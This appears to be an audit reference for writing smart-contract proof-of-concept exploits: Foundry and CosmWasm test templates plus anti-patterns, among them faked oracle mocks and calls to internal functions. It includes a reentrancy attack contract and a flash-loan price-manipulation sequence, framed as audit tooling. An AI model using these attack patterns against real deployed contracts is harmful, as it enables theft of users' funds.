# PoC Templates & Anti-Patterns

## Contents
- Foundry PoC template
- Attack contract pattern
- Cosmos/Rust PoC template
- Common anti-patterns with fixes

---

## Foundry PoC Template

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// @Vulnerability: [One-line description]
// @Impact: [Concrete impact - e.g., "Attacker drains all ETH from vault"]
// @Root Cause: [Why the bug exists]
// @Preconditions: [What must be true]

interface IVulnerableContract {
    // Declare ONLY functions you actually call
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}

contract VulnerabilityPoC is Test {
    IVulnerableContract target;
    address attacker;
    
    address constant TARGET = 0x...; // Real deployed address
    uint256 constant FORK_BLOCK = 12345678;
    
    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        target = IVulnerableContract(TARGET);
        attacker = makeAddr("attacker");
        deal(attacker, 1 ether); // Only what's realistically acquirable
    }
    
    function testVulnerabilityExploit() public {
        // --- SNAPSHOT ---
        uint256 vaultBalanceBefore = address(target).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        
        // --- EXPLOIT (attacker only, no special roles) ---
        vm.startPrank(attacker);
        // Step 1: [Real contract interaction]
        // Step 2: [Real contract interaction]
        vm.stopPrank();
        
        // --- VERIFY (concrete assertions) ---
        uint256 vaultBalanceAfter = address(target).balance;
        uint256 stolen = attacker.balance - attackerBalanceBefore;
        assertGt(stolen, 0.5 ether, "Attacker profited > 0.5 ETH");
        assertLt(vaultBalanceAfter, vaultBalanceBefore, "Vault lost funds");
    }
}
```

## Attack Contract Pattern (Callbacks)

```solidity
contract AttackContract {
    IVulnerableContract target;
    uint256 reentrancyCount;
    
    constructor(address _target) {
        target = IVulnerableContract(_target);
    }
    
    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }
    
    receive() external payable {
        if (reentrancyCount < 5) { // Bounded - no infinite loops
            reentrancyCount++;
            target.withdraw(msg.value);
        }
    }
}
```

## Cosmos/Rust PoC Template

```rust
#[cfg(test)]
mod exploit_tests {
    use super::*;
    use cosmwasm_std::testing::{mock_dependencies, mock_env, mock_info};
    
    /// @Vulnerability: [One-line description]
    /// @Impact: [Concrete impact]
    /// @Root Cause: [Why the bug exists]
    #[test]
    fn test_vulnerability_exploit() {
        let mut deps = mock_dependencies();
        let balance_before = query_balance(&deps, victim_addr);
        
        let attacker = mock_info("attacker", &[]);
        let msg = ExecuteMsg::VulnerableAction { /* params */ };
        let res = execute(deps.as_mut(), mock_env(), attacker, msg).unwrap();
        
        let balance_after = query_balance(&deps, victim_addr);
        assert!(balance_before > balance_after, "Victim lost funds");
        assert_eq!(
            balance_before - balance_after,
            expected_loss,
            "Exact loss amount matches"
        );
    }
}
```

---

## Common Anti-Patterns

### "The Admin Did It"

```solidity
// BAD: Admin creates the exploit condition
vm.prank(admin);
vault.setFeeRecipient(attacker);  // THIS is the vulnerability

// FIX: Show impact AFTER a realistic admin configuration
// Focus on the unexpected capability, not simulating admin action
```

### "The Oracle Whisperer"

```solidity
// BAD
vm.mockCall(oracle, ..., abi.encode(manipulatedPrice));

// FIX: Manipulate price through real on-chain actions
flashLoan.borrow(1000 ether);
router.swap(tokenA, tokenB, 1000 ether); // Moves real pool price
vault.liquidate(victim);
router.swap(tokenB, tokenA, ...);
flashLoan.repay(1000 ether + fee);
```

### "The Assertion Softener"

```solidity
// BAD
assertGt(profit, 0);

// FIX: Derive expected profit from bug mechanics
uint256 inflatedShares = totalSupply / (totalAssets + 1);
uint256 expectedProfit = (inflatedShares * totalAssets) / totalSupply - depositAmount;
assertGe(profit, expectedProfit * 95 / 100, "Profit matches inflation model (5% fee tolerance)");
```

### "The Mock Everything"

```solidity
// BAD: Testing your mocks, not the protocol
vm.mockCall(pool, "getReserves", abi.encode(1000e18, 500e18));
vm.mockCall(oracle, "getPrice", abi.encode(2000e8));
vm.mockCall(token, "balanceOf", abi.encode(100e18));

// FIX: Fork from mainnet. Real contracts, real state.
```

### "The Gas Guzzler"

```solidity
// BAD
for (uint i = 0; i < type(uint256).max; i++) { target.deposit(1 wei); }

// FIX: Calculate minimum iterations, cap explicitly
uint256 iterationsNeeded = targetBalance / minDeposit;
require(iterationsNeeded < 1000, "Too many iterations for mainnet");
for (uint i = 0; i < iterationsNeeded; i++) { target.deposit(minDeposit); }
```

### "The Internal Bypasser"

The agent calls an `internal` or `private` function directly to prove a bug, but the
public functions that call it have guards preventing the vulnerable state from ever being reached.

```solidity
// BAD: Calling internal function directly — bypasses all public guards
// The public function deposit() has `require(amount >= MIN_DEPOSIT)` which prevents
// the zero-amount edge case this PoC exploits.
target._internalCalculateShares(0);  // internal fn, never callable by attacker

// FIX: Go through the public entry point. If the guard blocks the exploit, the bug
// is NOT reachable and the PoC should not be written.
vm.prank(attacker);
target.deposit(0);  // This reverts with "amount below minimum" — bug is unreachable
// → HALT: Report that the internal bug is guarded by the public interface.
```

```rust
// BAD (Cosmos): Calling internal helper directly
let result = _update_rewards(&mut deps.storage, &attacker_addr, amount);
// The execute() handler that calls _update_rewards validates amount > 0 first

// FIX: Go through the real message handler
let msg = ExecuteMsg::ClaimRewards { amount: Uint128::zero() };
let res = execute(deps.as_mut(), env, info, msg);
// If this returns Err — the bug is unreachable through the public API.
```

### "The Impossible Environment"

The agent fabricates SDK/chain conditions that cannot exist in production.

```rust
// BAD (Cosmos): Creating a mock querier that returns impossible chain state
let mut deps = mock_dependencies();
// Fabricating a validator set where total_power = 0 — impossible on a live chain
deps.querier.update_staking("ustake", &[], &[]);
// The chain's consensus module ALWAYS has at least one validator with non-zero power

// FIX: Use realistic chain state or ask the user for the real environment
let validators = &[Validator { address: "val1".into(), commission: Decimal::percent(5),
    max_commission: Decimal::percent(20), max_change_rate: Decimal::percent(1) }];
deps.querier.update_staking("ustake", validators, &[]);
// If you need a condition the real chain can't produce, HALT and report it.
```

```typescript
// BAD (SDK): Creating framework conditions that the SDK prevents
const config = { maxValidators: 0 };  // SDK enforces minValidators >= 1
// Any bug that depends on zero validators is not exploitable

// FIX: Use conditions the SDK actually allows, or HALT
```

### "The Phantom Interface"

Creating mock interfaces that don't match how the real chain/module works.

```rust
// BAD (Cosmos): Mock bank module that allows negative balances
// The real bank module NEVER allows negative balances
fn mock_bank_send(from: &Addr, to: &Addr, amount: i128) -> StdResult<Response> {
    // This mock allows amount < 0, but the real chain doesn't
    Ok(Response::new())
}

// FIX: Use cosmwasm_std::testing mocks which enforce real constraints,
// or fork from a real chain state. If the real behavior is unknown, ASK the user.
```

### "The People Pleaser"

The agent knows the bug is unreachable or the environment is fabricated, but writes
the PoC anyway to avoid disappointing the reviewer.

```
// BAD: Agent internally recognizes the issue but proceeds anyway
// "The internal function has the bug, but the public function guards against it...
//  let me just call the internal function directly so the test passes."

// FIX: HALT and be honest
// "I could not produce a valid PoC because the vulnerable function `_calculateShares`
//  is internal and the public entry point `deposit()` has a `require(amount >= MIN_DEPOSIT)`
//  guard that prevents the zero-amount edge case from being reached. The vulnerability
//  exists in the code but is not exploitable through the public API."
```
